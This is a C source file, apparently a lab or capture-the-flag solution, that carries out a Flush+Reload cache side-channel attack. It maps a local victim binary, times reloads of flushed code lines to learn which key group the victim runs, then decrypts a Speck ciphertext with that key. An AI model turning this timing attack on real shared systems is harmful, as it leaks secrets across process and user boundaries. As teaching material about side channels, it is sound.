#include "common.h"
#include "speck.h"
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#define ENTRY 0x2000
#define STRIDE 0x40
#define NGROUPS SPECK_NUM_GROUPS
#define THRESHOLD 150
#define ROUNDS 2000

// waits n cycles
static void wait(int n)
{
    while (n--)
        asm volatile("" ::: "memory");
}

int main(void)
{
    // Read the victim's (public) ciphertext from stdin first, then run the
    // attack. The recovered group's key (from speck.h) decrypts it below.
    unsigned int ct;
    int flag = -1;
    printf("Enter ciphertext > ");
    fflush(stdout);
    if (scanf("%x", &ct) != 1)
    {
        printf("Invalid ciphertext!\n");
        return 1;
    }

    // TODO: Implement your attack here
    // L1i cache: 512 sets, 1 way, 64 byte cache size
    // tags | 9 bit set index | 6 bit offset
    // g0 in 0x2000 -> b0 | 010_0000_00 | 00_0000
    // g1 in 0x2040 -> b0 | 010_0000_01 | 00_0000
    // g2 in 0x2080 -> b0 | 010_0000_10 | 00_0000
    // so each function in different sets

    // g8r0 in 0x2200 -> b0 | 010_0010_00 | 00_0000
    // g8r21 in 0x17200 -> b10 | 111_0010_00 | 00_0000
    // rounds are 0x1000 apart = 64 sets apart (different set each round)
    // map the victim binary so we share its code pages (like part1's file)
    int fd = open("./victim", O_RDONLY);
    if (fd < 0)
    {
        perror("open");
        return 1;
    }
    struct stat st;
    fstat(fd, &st);
    uint8_t *vic = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (vic == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    // one probe line per group: g_i_r0 sits at ENTRY + i*STRIDE, its own set
    ADDR_PTR addr[NGROUPS];
    for (int i = 0; i < NGROUPS; i++)
        addr[i] = (ADDR_PTR)(vic + ENTRY + i * STRIDE);

    // shuffle probe order once so the prefetcher can't predict us
    srand(time(NULL) ^ getpid());
    int order[NGROUPS];
    for (int i = 0; i < NGROUPS; i++)
        order[i] = i;
    for (int i = NGROUPS - 1; i > 0; i--)
    {
        int j = rand() % (i + 1);
        int t = order[i];
        order[i] = order[j];
        order[j] = t;
    }

    // flush+reload: only the group the victim runs stays hot -> reloads fast
    int hits[NGROUPS] = {0};
    for (int r = 0; r < ROUNDS; r++)
    {
        for (int k = 0; k < NGROUPS; k++)
        {
            int i = order[k];
            clflush(addr[i]);
            wait(800);
            if (measure_one_block_access_time(addr[i]) < THRESHOLD)
                hits[i]++;
        }
    }

    // most-hit group is the flag
    int best = 0;
    for (int i = 0; i < NGROUPS; i++)
        if (hits[i] > best)
        {
            best = hits[i];
            flag = i;
        }

    printf("Flag: %d\n", flag);

    block pt = (block)ct;
    for (long i = 0; i < SPECK_ITERS; i++)
        pt = speck_decrypt(speck_keys[flag], pt);
    printf("ciphertext: %08x\n", ct);
    printf("plaintext: %04x %04x\n", (unsigned)((pt >> 16) & 0xffff),
           (unsigned)(pt & 0xffff));
    return 0;
}
